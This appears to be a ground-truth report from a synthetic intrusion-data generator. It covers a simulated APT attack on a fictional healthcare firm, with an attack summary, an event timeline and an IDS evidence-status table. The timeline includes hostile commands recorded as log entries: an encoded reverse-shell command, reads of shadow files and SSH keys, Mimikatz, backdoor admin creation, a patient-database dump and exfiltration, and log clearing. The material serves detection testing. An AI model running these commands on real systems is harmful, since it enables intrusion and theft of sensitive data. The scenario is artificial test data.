# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:12:15 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:18:06 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CZ76Q3OBRUhHSnl3D) |
| 2024-03-18 12:23:35 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:29:34 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:29:35 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:30:40 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (359 requests) |
| 2024-03-18 12:44:44 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:47:31 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:53:23 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: CcBcTl0288FtsrHeH6) |
| 2024-03-18 12:59:50 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CQJQvX4wbbGk42JqRJN) |
| 2024-03-18 12:59:51 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CBuQqeJgScenYaD3Lk) |
| 2024-03-18 13:20:06 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: C6azvFv5ExMD4e2c7D) |
| 2024-03-18 13:20:08 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581441) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:20:16 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CQiJmri7Czb0jtVmo1) |
| 2024-03-18 13:20:18 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:40:18 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584386) - `ip addr show` |
| 2024-03-18 13:40:25 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584414) - `cat /etc/hosts` |
| 2024-03-18 13:40:37 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584544) - `cat /etc/resolv.conf` |
| 2024-03-18 13:41:30 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 584569) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:41:43 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 585042) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:45:11 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 585069) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:50:27 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:55:42 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 14:00:15 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587169) - `cat /var/www/html/config.php` |
| 2024-03-18 14:00:21 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587188) - `ls -la /root/.ssh` |
| 2024-03-18 14:00:28 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587627) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:14:51 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: CLF839m5cciI3JxBn) |
| 2024-03-18 14:14:52 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: CVhD8ynIpPr5MsHkFL) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:34:58 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962137) - `cat /etc/passwd` |
| 2024-03-18 14:35:05 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962171) - `cat /etc/shadow` |
| 2024-03-18 14:49:42 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:59:05 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 15:00:06 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 15:00:08 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: CePAvIVxNsogU0cvIAk) |
| 2024-03-18 15:07:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:13:59 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: Cdh77D71YgyHeVy79tW) |
| 2024-03-18 15:20:19 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x2701433) |
| 2024-03-18 15:20:29 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6912) - `whoami /all` |
| 2024-03-18 15:20:32 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6920) - `net user /domain` |
| 2024-03-18 15:20:33 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6932) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:34 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6944) - `net view /domain` |
| 2024-03-18 15:20:37 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:38 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: CWlWG0QuDddfVN12DVW) |
| 2024-03-18 15:45:11 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6952) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:45:16 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:45:20 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 15:59:48 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5553376) |
| 2024-03-18 15:59:55 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 15:59:56 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5584) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 15:59:59 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5588) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:06:32 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:15:19 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5612) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:15:21 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:15:22 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5632) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:15:25 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:19:48 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5640) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:19:49 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5656) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:19:49 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:19:50 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:29:58 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:30:58 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:55 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 275 queries, 1416 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=275 emitted=6 filtered=269] |
| 2024-03-18 16:49:55 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 16:59:35 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=182 emitted=18 filtered=164] |
| 2024-03-18 17:00:57 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf884b13) |
| 2024-03-18 17:00:58 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6288) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:00:59 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6332) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:15:22 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CRgEwaiGGrwkVK6Se) |
| 2024-03-18 17:15:24 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 159016) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:19:31 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:20:15 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 161353) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:24:49 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:443 (UID: CV9r9AoDPRltI19V64) |
| 2024-03-18 17:29:50 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:34:19 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 162277) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:34:43 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:08 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608794) - `shred -u /root/.bash_history` |
| 2024-03-18 17:40:35 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982815) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:41:40 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6032) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:41:42 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 6064) - `wevtutil cl Security` |
| 2024-03-18 17:41:43 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:44:38 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:39 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:53 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:50:27 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6084) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:50:38 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:55:06 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:55:47 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:56:54 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 003327cb-2817-4c9e-ba2c-a1566750efc7 | ids | visible: 1 |
| 0491a75b-2cc9-42c6-973d-ded7de1702a0 | ids | delayed: 1 |
| 06426767-8f01-4336-8ddb-d29283879662 | ids | delayed: 1 |
| 07cde2f8-320c-4cbe-a198-293993727e9c | ids | delayed: 1 |
| 0a39caf6-d48e-4742-82df-44c89a6387aa | ids | delayed: 2 |
| 0acd85a9-75da-420f-8e47-32eb3c372303 | ids | delayed: 1 |
| 0e74b358-0826-4067-9a64-d8b055ffb644 | ids | delayed: 1 |
| 1241f147-f1e6-4e07-8bb0-e11cbab8644a | ids | delayed: 1 |
| 17adb5e0-7aad-4165-bd13-092109cef548 | ids | delayed: 1 |
| 1d5189c6-8012-4542-a0fe-872aa3b7b2f8 | ids | delayed: 1 |
| 21d003e8-182f-4efb-8b78-251d655476cf | ids | delayed: 1 |
| 232c7398-08f2-4c34-b236-c89cfc09ba76 | ids | delayed: 2 |
| 23c087a5-e05c-4536-85e1-5816a05ce3c4 | ids | delayed: 1 |
| 24f3533d-5691-456d-9582-f9f9cb338bff | ids | delayed: 1 |
| 251c0c10-2040-4607-811a-47a1c52ecb99 | ids | delayed: 1 |
| 2577b0f2-ea32-4347-b0e8-a48e721e1b20 | ids | delayed: 2 |
| 29186683-b654-411c-9d85-c33493f21f41 | ids | delayed: 2 |
| 29e25771-0f87-4a62-8a46-3be31592f437 | ids | delayed: 1 |
| 2bb224d7-0da0-4fb2-bf49-4ec43fe32186 | ids | delayed: 1 |
| 2eca7fa0-97e4-4e80-abc1-7cc06501f485 | ids | delayed: 2 |
| 2edde6c3-ce2d-49e6-8a41-91d553f4c0dc | ids | delayed: 1 |
| 2ee8e7bc-d0b9-4e0e-a0d9-ecfc09997e92 | ids | delayed: 1 |
| 2f5b7cde-fa22-4cfb-b7b9-c2c38db768c0 | ids | delayed: 1 |
| 3124f715-9bb4-4993-b6e7-648bd9c5f223 | ids | delayed: 1 |
| 31ce2979-781b-4e5c-845a-2b86d35c670e | ids | delayed: 1 |
| 322410c8-fd28-4841-8060-edc977eb02d6 | ids | delayed: 1 |
| 34132de0-3659-48b4-937e-a53dfa93c7d7 | ids | delayed: 1 |
| 344f58c3-70ff-4d32-ae75-64ab75052326 | ids | delayed: 1 |
| 3552644a-095c-454a-bec1-032529ca78b0 | ids | delayed: 1 |
| 35b24c45-0c75-403b-82d7-3c9792ee5b63 | ids | delayed: 1 |
| 372eeb5e-c4f5-41da-9e76-4c7ed64af18e | ids | delayed: 1 |
| 3758fdbb-9bbc-4a21-953b-17387e7575fa | ids | delayed: 1 |
| 3a480b8b-8990-42e0-a9a2-3ea7f6da7a14 | ids | delayed: 1 |
| 3aa0f83a-9922-48fc-a341-fa7df625363a | ids | delayed: 1 |
| 3bbee551-9e27-4229-a124-b5ffecf380e9 | ids | delayed: 1 |
| 3e998194-c588-45ba-8ba3-069a2ffd30a8 | ids | delayed: 1 |
| 40deb375-ba23-4f17-806e-9a9ed48dd42e | ids | delayed: 1 |
| 429a8179-6794-4d66-9f09-e582adaedeb2 | ids | delayed: 2 |
| 4342958e-da02-4cbd-b248-e23518a63b5a | ids | delayed: 2 |
| 442d570c-0cd6-4171-a09a-e9d919890802 | ids | delayed: 1 |
| 47280414-d90f-4c33-a87e-0e9cabac5d9a | ids | delayed: 1 |
| 4bc19702-3cce-474e-81cb-6981a2c72589 | ids | delayed: 1 |
| 5019cdfc-f3cc-4516-82e0-9ee303f2d22d | ids | delayed: 1 |
| 5ab5df03-945d-42e2-b125-6faf2acbc04d | ids | delayed: 1 |
| 5ac5f5a6-eed2-4773-99d9-b75fc98a5931 | ids | delayed: 2 |
| 5c200b21-4f56-4988-80cc-92742488c1e6 | ids | delayed: 1 |
| 5fa09e2b-5502-4896-b65c-1b8e0136f3ce | ids | delayed: 1 |
| 604259d2-1aef-4557-9758-a02d0980fa45 | ids | delayed: 1 |
| 64e17990-329f-4e1b-9320-1331cc1c73fa | ids | delayed: 1 |
| 65530a4d-29cd-48b9-b774-7902310a2e97 | ids | delayed: 1 |
| 6929dac6-d236-4fac-a629-d7e0e01050ef | ids | delayed: 1 |
| 69f6e0f3-d03f-4386-8e22-8d36ea0d96cf | ids | delayed: 1 |
| 6c309880-28cc-4a70-80fb-cd047c0c04a4 | ids | visible: 1 |
| 6e25dca6-c16a-4d08-aab2-1514dea01d1c | ids | delayed: 2 |
| 6e8df1d7-fdb8-419b-81e2-42565e22c84f | ids | delayed: 1 |
| 7093bb1b-1653-4549-9f03-f4478d29a731 | ids | delayed: 2 |
| 71c120f6-7c6c-4c67-a587-011c10f92dd4 | ids | delayed: 2 |
| 737d9a4e-f8fd-4154-9b84-ffb11abf911a | ids | delayed: 1 |
| 752bedfa-fd99-4d83-8de9-58ad4512ee85 | ids | delayed: 1 |
| 80638fd4-de15-478d-9899-e742380b6f86 | ids | delayed: 1 |
| 816c5de7-e4a3-444b-8822-e0768ae978e3 | ids | delayed: 1 |
| 82320a98-7b91-47fd-a980-2e7064e9a244 | ids | delayed: 1 |
| 832c2d81-7856-4cef-b4b9-f9f3f6534139 | ids | delayed: 1 |
| 8387acd6-74cd-44a7-82e6-93b6a1e72ea3 | ids | delayed: 1 |
| 83f44df0-d728-4d86-84ce-6b73ec5dccd4 | ids | delayed: 1 |
| 84f3f2a0-2c9e-4bf1-a5e6-162c7bf638fd | ids | delayed: 1 |
| 866f2bff-a506-480f-84a3-466c160daf21 | ids | delayed: 1 |
| 895e81e7-9e16-40c8-8708-de6643da4f6c | ids | delayed: 1 |
| 8c6b6cc4-ab16-49d2-97d4-e8c41772f96a | ids | delayed: 1 |
| 8e8c458e-5cd2-4227-9bec-9773a219a465 | ids | delayed: 1 |
| 8e9ad497-9d3d-4960-a6a8-40972c3798b4 | ids | delayed: 1 |
| 8f17a458-8672-4454-b82c-03a8708a0326 | ids | delayed: 1 |
| 8fcf288b-a57e-4c83-8273-ce061692faa7 | ids | delayed: 1 |
| 90d9231d-619c-4401-b544-49bd9d9b6761 | ids | delayed: 1 |
| 90e2ffd1-2473-4975-805f-41e851423ddd | ids | delayed: 1 |
| 989e318d-49cd-4bc5-b0c0-ccdcbb94ec7f | ids | delayed: 1 |
| 9cf84bec-9350-4ac9-972e-d47a8aee4257 | ids | delayed: 1 |
| 9d8c9f67-d5b2-466f-a16a-ff4063100ac1 | ids | delayed: 1 |
| 9dae36b0-3487-4b8e-b7c6-6a764ee48c78 | ids | delayed: 1 |
| 9db04d62-643d-4f46-bb9e-c540da8553b6 | ids | delayed: 1 |
| 9dbb26f7-c48a-46ed-a6bc-c3de858f1691 | ids | delayed: 1 |
| a2a40de9-162e-432c-ab6b-ed00207a2d2b | ids | delayed: 2 |
| a3e9ff3d-f93d-4109-90dc-48b5a1f5bb38 | ids | delayed: 2 |
| a52422f6-89e6-43cd-8e61-bd1184fd86ec | ids | delayed: 1 |
| a7378362-4cae-4764-ae0f-d35527f75789 | ids | delayed: 1 |
| a73fec0e-e09d-404a-a866-fbf86ccc8663 | ids | delayed: 1 |
| a7f066a7-0686-4b2b-b5ea-3eebcda2460d | ids | delayed: 2 |
| a85d1dfe-93d9-4bdd-9eeb-02ca5fd3b400 | ids | delayed: 1 |
| af90e75a-5954-43a9-9f11-589d93ad574c | ids | delayed: 1 |
| b315d42f-f2b1-4196-9fec-ecacde8bc11c | ids | delayed: 1 |
| b4298f67-b05d-4d46-a672-90230db9ce3c | ids | delayed: 1 |
| b46b36c0-e647-471f-afdf-a2441e5d15c3 | ids | delayed: 1 |
| b4b357a0-d0ad-4768-a54b-926a763ed424 | ids | delayed: 1 |
| b5e018f3-4bf5-43f1-9996-265ea5c2b39e | ids | delayed: 1 |
| b8603733-2069-4f6c-afb7-3bf6b24c94a0 | ids | delayed: 1 |
| b8eec8d8-bd6b-40f0-b454-6f7e6364410f | ids | delayed: 2 |
| b94daa87-41aa-4d38-9b65-5efaaf351182 | ids | delayed: 1 |
| bf952025-ca59-4401-9d3b-a24c3d71e518 | ids | delayed: 1 |
| c20fba31-46cb-46da-8430-499b28f496c6 | ids | delayed: 2 |
| c5ec57a6-837d-4057-b77e-161af94f0c6b | ids | delayed: 1 |
| c6661c78-ecfd-4c3c-bc99-cf21929cb8e8 | ids | delayed: 1 |
| c8f22963-8342-487b-b1f8-21d67d3b5f1f | ids | delayed: 2 |
| c94241a6-d21a-4d03-8298-97ab66601b70 | ids | delayed: 1 |
| c9f674ad-407a-46fe-bb15-88ad1b353665 | ids | delayed: 1 |
| cf909677-5721-4079-8c93-caae46fa7849 | ids | delayed: 1 |
| d440286b-26ea-4c81-8326-e0f19f33e2d4 | ids | delayed: 2 |
| d51b4ae3-a00d-486b-ad8a-264660015de6 | ids | delayed: 1 |
| daa0022a-ea33-4505-917a-a09ad4130d6a | ids | delayed: 1 |
| daa7ce86-5e04-4119-8d5d-cc0f1bfb3bb3 | ids | delayed: 2 |
